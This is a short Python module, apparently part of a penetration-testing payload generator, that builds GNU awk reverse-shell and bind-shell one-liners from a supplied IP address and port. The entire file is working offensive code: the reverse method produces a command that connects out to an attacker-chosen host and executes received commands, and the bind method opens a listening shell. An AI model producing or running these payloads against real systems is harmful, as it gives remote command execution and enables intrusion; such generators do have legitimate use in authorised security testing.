"""
AWK reverse and bind shell payload generators.

Author: Mostafa Tamime
"""

from generators.base import PayloadGenerator


class AwkGenerator(PayloadGenerator):
    """Standard GNU awk /inet reverse shells (bind via TCP service)."""

    def reverse(self, ip: str, port: int) -> str:
        return (
            f"awk 'BEGIN{{s=\"/inet/tcp/0/{ip}/{port}\";"
            f"for(;s|&getline c;close(s))"
            f'while(c|getline)print|&s;close(c)}}\'')

    def bind(self, port: int) -> str:
        return (
            f"awk 'BEGIN{{s=\"/inet/tcp/{port}/0/0\";"
            f"for(;s|&getline c;close(s))"
            f'while(c|getline)print|&s;close(c)}}\'')

    def file_extension(self) -> str:
        return ".awk"
